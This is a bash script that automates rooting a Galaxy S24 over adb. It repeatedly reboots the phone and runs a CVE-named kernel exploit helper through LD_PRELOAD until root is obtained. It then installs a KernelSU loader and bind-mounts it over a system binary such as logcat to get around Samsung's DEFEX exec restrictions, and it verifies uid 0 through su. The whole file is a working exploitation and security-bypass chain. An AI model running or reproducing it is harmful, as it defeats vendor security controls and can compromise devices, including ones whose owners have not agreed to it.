#!/bin/bash
# solid_root.sh v3 — THE REPEATABLE PROCEDURE for e1q / SM-S921W (Galaxy S24). PROVEN END-TO-END.
# Verified 2026-10-02: su -c id -> uid=0(root) ... context=u:r:ksu:s0
#
# ONE-TIME (persistent in /data/adb, survives reboots):
#   /data/adb/ksud + /data/adb/ksu/bin/ksud = ksud-e3q-S9280ZCS6DZF2-kdp, md5 939a2f454946baf9de4409d16c5a2180
#   /data/adb/ksud IS KSUD_PATH (kernel/runtime/ksud.h): sucompat opens exactly that file and refuses to
#   intercept su at all if it is missing. It also redirects access/stat of "su" to ksud, so `su` appears to
#   exist even though /system/bin is read-only erofs and there is no real su file on disk.
#
# EVERY BOOT (root and the module are both volatile):
#   1. get a live exploit root (grinds one if there isn't one)
#   2. load the module with --allow-shell. This is the whole ballgame: sucompat's first gate is
#      ksu_is_allow_uid_for_current(), and uid 2000 is allowed ONLY when allow_shell=1 (policy/allowlist.c).
#      allow_shell is module_param(allow_shell, bool, 0) — mode 0, no sysfs knob — so it can never be
#      changed after load. Load without it and shell gets no root for that entire boot.
#   3. verify: su -c id == uid=0 in u:r:ksu:s0
#
# THE DEFEX WALL: DEFEX kills any privileged exec whose path is not in a system partition —
# `[DEFEX] Safeplace violation [task=sh, child=/data/adb/ksud, uid=0]`. /data/adb, /data/local/tmp and /dev
# are ALL refused, so the loader can never be run from where we have write access. The fix (this is what
# the exploit helper's own guarded wrapper does; its strings show it uses /system/bin/logcat) is to
# bind-mount the loader OVER an existing system binary and run that path. overlayfs over /system/bin is not
# available on this kernel (mount -> EINVAL) and erofs is read-only, so shadowing one file is the way in.
# The bind lives only for that boot and disappears on reboot.
#
# ONLY ksud-e3q-S9280ZCS6DZF2-kdp may be loaded: ksud-e3q-S928USQS6DZF2-kdp patches sys_call_table and
# Samsung RKP resets the phone instantly (handoff §8, /proc/last_kmsg).
#
# usage: bash solid_root.sh [max_boots]
set -u
cd /srv/storage/work/s24-root-payloads-2026-09-30
MAXBOOTS=${1:-8}
LOG=logs/host/solid_root_$(date +%Y%m%d_%H%M%S).log
mkdir -p logs/host
SO=${SOLID_PRELOAD:-/data/local/tmp/cve-e1q-101-stable.so}
H=${SOLID_HELPER:-/data/local/tmp/cve-2026-43499-root}
LOADER_SRC=/data/local/tmp/ksud-candB           # ksud-e3q-S9280ZCS6DZF2-kdp md5 939a2f454946baf9de4409d16c5a2180
KSUD=/data/adb/ksud                             # KSUD_PATH — persistent
KSUD_MD5=939a2f454946baf9de4409d16c5a2180
KMI=android14-6.1
SHADOW_CANDIDATES="/system/bin/logcat /system/bin/atrace /system/bin/dumpstate /system/bin/abx2xml"

# Two concurrent attempts starve each other's pipe budget (uid-2000 pipe-user-pages-soft=16384, one
# attempt burns ~15360), so a global lock is mandatory — manual runs and the autoroot watcher both take it.
LOCK=${TMPDIR:-/tmp}/solid_root.lock
exec 9>"$LOCK"
if ! flock -n 9; then echo "another solid_root run holds $LOCK; exiting"; exit 0; fi

say(){ echo "$(date +%H:%M:%S) $*" | tee -a "$LOG"; }
recover(){ adb kill-server >/dev/null 2>&1; sleep 1; adb start-server >/dev/null 2>&1; sleep 2; }
adb_shell(){ timeout 40 adb shell "$1" 2>/dev/null | tr -d '\r'; }
probe(){ local out; out=$(adb_shell "$1"); if [ -z "$out" ]; then recover; out=$(adb_shell "$1"); fi; printf '%s' "$out"; }
adb_up(){ for i in 1 2 3 4 5; do adb devices 2>/dev/null | grep -q "device$" && return 0; recover; sleep 3; done; return 1; }
root_id(){ adb_shell "$H -c 'id'" 2>/dev/null; }
have_root(){ root_id | grep -q "uid=0"; }
su_works(){ adb_shell "su -c id" 2>/dev/null | grep -q "uid=0"; }

say "=== solid_root v3: e1q-S921WVLS6DZH3 · loader=ksud-e3q-S9280ZCS6DZF2-kdp · allow_shell=1 ==="

# ---------------------------------------------------------------- 0. already solid? never touch a working boot
if su_works; then
  say "already solid on this boot: $(adb_shell 'su -c id' 2>/dev/null)"
  exit 0
fi

# ---------------------------------------------------------------- 1. a live root, or grind one
# /data/local/tmp persists across reboots, so a socket left by a previous boot's root daemon survives and
# blocks/stales the new one: every helper call then returns "su: connect daemon: Permission denied" and the
# lottery looks broken when it is not. Clear the corpse before probing or grinding.
rm -f /data/local/tmp/temp_su.sock 2>/dev/null
adb shell "rm -f /data/local/tmp/temp_su.sock; rm -rf /data/local/tmp/solid/old" >/dev/null 2>&1
if have_root; then
  say "root already live on this boot — not rebooting"
else
  say "no live root; grinding (max $MAXBOOTS boots x 10 attempts)"
  for b in $(seq 1 "$MAXBOOTS"); do
    say "--- boot $b ---"
    adb reboot >/dev/null 2>&1; sleep 10
    adb_up || { say "boot $b: adb gone"; continue; }
    B=""; for i in $(seq 1 30); do B=$(probe "getprop sys.boot_completed"); [ "$B" = "1" ] && break; sleep 10; done
    [ "$B" = "1" ] || { say "boot $b: no boot_completed"; continue; }
    probe "settings put system screen_off_timeout 3600000; svc power stayon true" >/dev/null
    U=0; for i in $(seq 1 40); do U=$(probe "cut -d. -f1 /proc/uptime"); [ -n "$U" ] && [ "$U" -ge 130 ] 2>/dev/null && break; sleep 5; done
    say "boot $b: quiet_uptime=$U"
    DEAD=0
    for a in $(seq 1 10); do
      D=/data/local/tmp/solid/b${b}a${a}
      probe "mkdir -p $D; : > $D/gate.txt" >/dev/null
      probe "setsid sh -c 'EXPLOIT_ATTEMPTS=1 P0_GATE_SLOT_INDEX=0 CVE43499_ROOT_HELPER=$H LD_PRELOAD=$SO nohup sleep 3600 > $D/gate.txt 2>&1' </dev/null >/dev/null 2>&1 &" >/dev/null
      RES=""
      for i in $(seq 1 12); do
        sleep 12
        T=$(probe "tail -c 3000 $D/gate.txt")
        case "$T" in *"exploit completed"*) RES=success; break;; *"exploit failed"*|*"refusing retry"*) RES=failed; break;; esac
      done
      if have_root; then say "boot $b attempt $a: ROOT LIVE"; break 2; fi
      if [ "$RES" = "success" ]; then say "boot $b attempt $a: exploit says success, root not answering yet"; fi
      case "$(probe "grep -c 'cfi misc_fops mismatch' $D/gate.txt")" in 0) DEAD=$((DEAD+1));; *) DEAD=0;; esac
      [ "$DEAD" -ge 3 ] && { say "boot $b: 3 dead attempts, rebooting"; break; }
      adb devices 2>/dev/null | grep -q "device$" || { say "boot $b: adb lost"; break; }
    done
  done
  have_root || { say "FAILED: no root after $MAXBOOTS boots"; exit 1; }
fi
say "root: $(root_id)"

# ---------------------------------------------------------------- 2. userspace (idempotent, persistent)
GOT=$(probe "md5sum $KSUD 2>/dev/null" | awk '{print $1}')
if [ "$GOT" = "$KSUD_MD5" ]; then
  say "userspace already installed at $KSUD (md5 matches)"
else
  say "--- installing userspace (before the load; the load kills the root bridge) ---"
  probe "$H -c 'mkdir -p /data/adb/ksu/bin; cp $LOADER_SRC $KSUD; chmod 755 $KSUD; chown 0:0 $KSUD; cp $KSUD /data/adb/ksu/bin/ksud; chmod 755 /data/adb/ksu/bin/ksud; md5sum $KSUD'" | tee -a "$LOG"
fi

# ---------------------------------------------------------------- 3. load with --allow-shell, from a system path
SHADOW=""
for c in $SHADOW_CANDIDATES; do
  [ "$(probe "test -e $c && echo yes")" = "yes" ] && { SHADOW=$c; break; }
done
[ -n "$SHADOW" ] || { say "no system binary available to shadow; aborting load"; exit 3; }
say "--- bind-mount $KSUD over $SHADOW (DEFEX permits exec only from a system path) ---"
probe "$H -c 'mount --bind $KSUD $SHADOW; echo bind_rc=\$?; ls -la $SHADOW'" | tee -a "$LOG"
say "--- load: $SHADOW late-load --allow-shell --ephemeral --kmi $KMI ---"
L=$(timeout 300 adb shell "$H -c '$SHADOW late-load --allow-shell --ephemeral --kmi $KMI 2>&1 | tail -12'" 2>&1 | tr -d '\r')
echo "$L" | tee -a "$LOG"
sleep 8

# ---------------------------------------------------------------- 4. verify
say "--- verify ---"
MODS=$(adb_shell "grep kernelsu /proc/modules" 2>/dev/null)
say "module: ${MODS:-<not present>}"
ID=$(adb_shell "su -c id" 2>/dev/null)
say "su -c id: ${ID:-<no output>}"
if printf '%s' "$ID" | grep -q "uid=0"; then
  say "*** SUCCESS: exploit root -> module(allow_shell=1) -> sucompat -> uid 0 (u:r:ksu:s0) ***"
  say "env: $(adb_shell 'su -c "getenforce; grep -c kernelsu /proc/modules"' 2>/dev/null | tr '\n' ' ')"
  # Never let a poisoned node survive into the next boot: the KSU-loaded boot left
  # /data/local/tmp/temp_su.sock in a state shell can neither stat, connect to, nor unlink
  # (s?????????, rm -> EACCES), and that path is the exploit's authoritative root channel, so a
  # poisoned node silently kills every later boot's root. Only root can delete it.
  say "cleanup: $(adb_shell "su -c 'rm -f /data/local/tmp/temp_su.sock /data/local/tmp/su_temp.sock; ls /data/local/tmp/temp_su.sock 2>&1'" 2>/dev/null | tr '\n' ' ')"
  exit 0
fi
if [ -n "$MODS" ]; then
  say "module loaded but su refused => allow_shell did not take. Nothing can fix that after load"
  say "(module_param mode 0). Reboot and re-run; every boot is independent."
else
  say "module did not load. Check whether the shadowed exec was DEFEX-killed in the next boot's /proc/last_kmsg."
fi
exit 2
